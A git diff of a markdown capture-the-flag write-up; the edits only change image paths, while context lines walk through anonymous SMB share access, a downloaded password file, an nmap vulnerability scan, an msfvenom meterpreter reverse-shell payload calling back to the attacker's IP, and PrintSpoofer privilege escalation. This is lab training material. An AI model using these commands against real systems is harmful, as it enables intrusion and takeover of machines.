@@ -22,7 +22,7 @@ sticker: emoji//1f440
 A lot of ports are open, let's proceed to check the website located at port `80`
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122171440.png)
+![](cybersecurity/images/Pasted%2520image%252020241122171440.png)
 
 Nothing useful is in here, let's skip the fuzzing part as it doesn't contain anything too.
 
@@ -42,7 +42,7 @@ Let's run the following command to list the shares in `SMB`:
 
 `smbclient -l IP`
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122173253.png)
+![](cybersecurity/images/Pasted%2520image%252020241122173253.png)
 
 We find a share `nt4wrksv`, let's research to check if there's a way to access to it:
 
@@ -57,19 +57,19 @@ Command used
 
 If we use that, we are able to connect even without the password:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122173850.png)
+![](cybersecurity/images/Pasted%2520image%252020241122173850.png)
 
 ```
 
 We are in and found a `passwords.txt` file, let's download it and take a look at it:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122173939.png)
+![](cybersecurity/images/Pasted%2520image%252020241122173939.png)
 
 Seems like two passwords, both are `base64` encoded, let's decode them:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122174102.png)
+![](cybersecurity/images/Pasted%2520image%252020241122174102.png)
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122174229.png)
+![](cybersecurity/images/Pasted%2520image%252020241122174229.png)
 
 We got the following credentials:
 
@@ -91,7 +91,7 @@ Let's scan the machine further to check if there's anything vulnerable, for this
 If we use: `nmap -Pn -script vuln IP`, we get the following:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122180438.png)
+![](cybersecurity/images/Pasted%2520image%252020241122180438.png)
 The `3389` port is vulnerable to RCE. let's get a shell.
 
 ```
@@ -107,15 +107,15 @@ Nice, for the exploitation part we need to do the following:
 
 1. Use msfvenom and create the reverse shell: `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=OURIP lport=ourport -f aspx -o reverse_shell.aspx`
 2. Upload the reverse shell file to the network share:
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122182149.png)
+![](cybersecurity/images/Pasted%2520image%252020241122182149.png)
 3. Use curl to retrieve the reverse shell: `curl http://IP:49663/nt4wrksv/reverse_shell.aspx`
 4. Let's use metasploit's multi handler to create a listener:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122182439.png)
+![](cybersecurity/images/Pasted%2520image%252020241122182439.png)
 
 Let's run the multi handler and use curl at the same time to get our shell:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122182628.png)
+![](cybersecurity/images/Pasted%2520image%252020241122182628.png)
 
 
 
@@ -135,7 +135,7 @@ Nice, let's do privilege escalation
 For privilege escalation, we need to investigate the machine, let's take a look at the privileges using `getprivs`:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122182831.png)
+![](cybersecurity/images/Pasted%2520image%252020241122182831.png)
 
 Most interesting one is the `SeImpersonatePrivilege`, we can impersonate, for this privilege escalation, we'll be impersonating `PrintSpoofer`:
 
@@ -146,13 +146,13 @@ Script: [GITHUB LINK](https://github.com/itm4n/PrintSpoofer/releases/download/v1
 
 Once we've put the script inside of our machine using smb, we can do the following:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122183155.png)
+![](cybersecurity/images/Pasted%2520image%252020241122183155.png)
 
 Switch to shell and go to this route: 
 
 `c:/inetpub/wwwroot/nt4wrksv`
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122183251.png)
+![](cybersecurity/images/Pasted%2520image%252020241122183251.png)
 
 We can now see our `PrintSpoofer64.exe` program, we need to do the following in order to get a reverse shell:
 
@@ -161,7 +161,7 @@ We can now see our `PrintSpoofer64.exe` program, we need to do the following in 
 We are taking advantage of the `SeImpersonatePrivilege`, let's get our root shell:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020241122183438.png)
+![](cybersecurity/images/Pasted%2520image%252020241122183438.png)
 
 And just like that, CTF is done.
 
